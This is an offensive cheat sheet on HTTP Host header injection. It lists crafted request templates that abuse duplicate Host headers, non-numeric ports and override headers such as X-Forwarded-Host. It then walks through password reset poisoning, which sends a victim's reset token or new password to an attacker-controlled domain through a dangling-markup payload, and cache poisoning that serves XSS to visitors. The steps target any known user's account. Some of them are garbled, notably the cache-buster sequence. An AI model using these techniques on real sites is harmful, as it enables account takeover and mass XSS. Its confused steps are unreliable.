# Header injection

## Summary
* [Injecting ambiguous request into arbitrary header](#injecting-ambiguous-request-into-arbitrary-header)
    * [Inject duplicate host headers](#inject-duplicate-host-headers)
    * [Supply an absolute url](#supply-an-absolute-url)
    * [Indenting HTTP headers with blank characters](#indenting-http-headers-with-blank-characters)
    * [Adding non-numeric port to the host header](#adding-non-numeric-port-to-the-host-header)
    * [Injecting malicious code into "X-Forwarded-Host"](#injecting-malicious-code-into-x-forwarded-host)
    * [Other similar HTTP headers](#other-similar-http-headers-with-similar-purpose)
* [Password reset poisoning attack](#password-reset-poisoning-attack)
    * [Basic password reset poisoning](#basic-password-reset-poisoning)
    * [Password reset poisoning via middleware](#password-reset-poisoning-via-middleware)
    * [Password reset poisoning via dangling markup](#password-reset-poisoning-via-dangling-markup)
* [Web cache poisoning via host header attack](#web-cache-poisoning-via-the-host-header-attack)

## Injecting ambiguous request into arbitrary header
### Inject duplicate host headers
```
> Host: vulnerable-website.com
> Host: malicious code here
```
### Supply an absolute url
```
> GET https://vulnerable-website.com/ HTTP/1.1
> Host: malicious code here
```
### Indenting HTTP headers with blank characters
```
> GET /example HTTP/1.1
>      Host: malicious code here
> Host: vulnerable-website.com
```
### Adding non-numeric port to the Host header
```
> GET /example HTTP/1.1
> Host: vulnerable-website.com:bad stuff here
```
### Injecting malicious code into "X-Forwarded-Host"
```
> GET /example HTTP/1.1
> Host: vulnerable-website.com
> X-Forwarded-Host: malicious code here
```
### Other similar HTTP headers with similar purpose
```
> X-Host
> X-Forwarded-Server
> X-HTTP-Host-Override
> Forwarded
```

## Password reset poisoning attack
### Basic password reset poisoning
```
> go to any login page and request for password reset for your own account
> observe what happens and most "password reset" link will contain a temporary token
> now request for password reset for any email address that is known but replace the "Host" header with attacker domain server name
> navigate to access log on attacker domain server and notice there is a GET request with temporary token in the url that should be for the victim account
> copy the previous password reset url for your own account and replace the token with the victim token
> go to the url and change the password
```
### Password reset poisoning via middleware
```
> go to any login page and request for password reset for your own account
> observe what happens and most "password reset" link will contain a temperory token
> now request for password reset for any known email address and replace the "Host" header with attacker domain server name
> notice that the website or the server does not recognized the domain server and as result, no temporary token were generated
> request for password reset again but this time, leave the "Host" header as usual but then add another header "X-Forwarded-Host: attacker.domain.server.name"
> send the request and notice that the password reset request is successful
> navigate to access log on attacker domain server and notice there is a GET request with temporary token in the url that should belong to the victim account
> copy the previous password reset url for your own account and replace the token with the victim token
> go to the url and change the password
```
### Password reset poisoning via dangling markup
```
> go to any login page and request for password reset for your own accound
> observe what happens and this time the password reset link does not contain any temporary token, instead a new password for the user is sent
> trying to change the Host header and injecting "Host override headers" do not get us anywhere
> now request for password reset for any known email address and add a non-numeric port to the "Host" header like this = Host: example.com:<a href=attacker.domain.server.name/?
> send the request and notice that the password reset request is successful
> navigate to access log on attacker domain server and notice there is a GET request with the password created by the website
> login into the victims accound and the newly generated password
```

## Web cache poisoning via the host header attack
```
> request for the website and observe how the response work
> notice that there is a "X-Cache" header in the response
> the "X-Cache" header needs to have a "hit" value, that is how we know any request that is made to the website is cached
> add a cache buster in the "GET /?cb=123" and observe the response
> the "X-Cache" header has a hit value
> now remove the the cache buster and try to request again
> in the second request, the cache buster is still there because earlier, the cache buster is already cached within the website
> now send another request with a second "Host" header and set it to the attacker domain server name
> send a request for the page and observe the response, notice how the second "Host" header value is already cached
> this means we can make the victim website to be redirect to the attacker domain server that will run a XSS script
> request the page with the cache buster again also with the second "Host" header to cache the latest request
> now the victims website will run the XSS script stored inside the attacker domain server 
```
